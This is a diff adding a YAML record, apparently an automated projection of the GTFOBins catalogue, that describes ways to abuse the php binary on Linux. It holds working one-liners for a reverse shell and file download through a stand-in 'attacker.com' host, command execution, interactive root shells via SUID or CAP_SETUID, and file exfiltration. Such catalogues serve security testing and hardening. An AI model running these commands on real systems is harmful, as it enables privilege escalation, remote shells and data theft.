@@ -1,0 +1,175 @@
+id: gtfobins/php/upload/suid
+type: binary
+platform: linux
+name: php
+phases:
+- exfiltration
+- privilege-escalation
+capabilities:
+- file-upload
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: php -S 0.0.0.0:80
+references:
+- https://gtfobins.github.io/gtfobins/php/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        php:
+          functions:
+            command:
+            - code: php -r 'echo shell_exec("/path/to/command");'
+              contexts:
+                sudo: null
+                suid:
+                  shell: true
+                unprivileged: null
+            - code: php -r '$r=array(); exec("/path/to/command", $r); print(join("\n",$r));'
+              contexts:
+                sudo: null
+                suid:
+                  shell: true
+                unprivileged: null
+            - code: php -r '$p = array(array("pipe","r"),array("pipe","w"),array("pipe", "w"));$h = @proc_open("/path/to/command",
+                $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2]))
+                echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'
+              contexts:
+                sudo: null
+                suid:
+                  shell: true
+                unprivileged: null
+            download:
+            - code: php -r '$c=file_get_contents("http://attacker.com/path/to/input-file"); file_put_contents("/path/to/output-file",
+                $c);'
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              sender: http-server
+            file-read:
+            - code: php -r 'readfile("/path/to/input-file");'
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            file-write:
+            - code: php -r 'file_put_contents("/path/to/output-file", "DATA");'
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            reverse-shell:
+            - code: php -r '$sock=fsockopen("attacker.com",12345);exec("/bin/sh -i 0<&3 1>&3 2>&3");'
+              contexts:
+                sudo: null
+                suid:
+                  shell: true
+                unprivileged: null
+              listener: tcp-server
+            shell:
+            - code: php -r 'system("/bin/sh -i");'
+              contexts:
+                capabilities:
+                  code: php -r 'posix_setuid(0); system("/bin/sh -i");'
+                  list:
+                  - CAP_SETUID
+                sudo: null
+                suid:
+                  shell: true
+                unprivileged: null
+              tty: false
+            - code: php -r 'passthru("/bin/sh -i");'
+              contexts:
+                capabilities:
+                  code: php -r 'posix_setuid(0); passthru("/bin/sh -i");'
+                  list:
+                  - CAP_SETUID
+                sudo: null
+                suid:
+                  shell: true
+                unprivileged: null
+              tty: false
+            - code: php -r '$h=@popen("/bin/sh -i","r"); if($h){ while(!feof($h)) echo(fread($h,4096));
+                pclose($h); }'
+              contexts:
+                capabilities:
+                  code: php -r 'posix_setuid(0); $h=@popen("/bin/sh -i","r"); if($h){ while(!feof($h))
+                    echo(fread($h,4096)); pclose($h); }'
+                  list:
+                  - CAP_SETUID
+                sudo: null
+                suid:
+                  shell: true
+                unprivileged: null
+              tty: false
+            - code: php -r 'pcntl_exec("/bin/sh");'
+              contexts:
+                capabilities:
+                  code: php -r 'posix_setuid(0); pcntl_exec("/bin/sh");'
+                  list:
+                  - CAP_SETUID
+                sudo: null
+                suid:
+                  code: php -r 'pcntl_exec("/bin/sh", ["-p"]);'
+                  shell: false
+                unprivileged: null
+            upload:
+            - code: php -S 0.0.0.0:80
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              receiver: http-client
+              version: '>= 5.4'
+    upstream_url: https://gtfobins.github.io/gtfobins/php/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: file-upload
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: exfiltration
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: suid
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:fe96f7d545e95081203444815336bbaa86010061a0ca7d828a6f116a56028c85
